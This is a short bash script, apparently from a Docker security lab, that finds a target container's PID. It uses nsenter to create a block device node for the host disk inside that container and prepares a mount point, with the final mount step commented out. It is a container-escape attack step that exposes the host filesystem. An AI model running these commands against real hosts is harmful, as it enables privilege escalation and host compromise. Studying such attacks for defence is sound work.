#!/bin/bash

attack="/home/ubuntu/Security-on-Docker/Attacks/Nsenter/Mount_hosts_filesystem"

docker ps | grep attacked_nsenter > dockerps
cut -d' ' -f1 dockerps > containerid
container_id=$(cat containerid)
docker inspect --format {{.State.Pid}} ${container_id} > PID
container_pid=$(cat PID)
#rm PID
major=$(cat major_num)
minor=$(cat minor_num)
dev=$(cat sdev_of_fs)
#dev="/dev/vda1"
#Done by attacker inside host
#: <<'END'
nsenter --target ${container_pid} --mount --pid mknod --mode 0600 ${dev} b ${major} ${minor}
nsenter --target ${container_pid} --mount --pid mkdir -p /tmpmount
#nsenter --target ${container_pid} --mount --pid -- mount /dev/vda1 /tmpmount
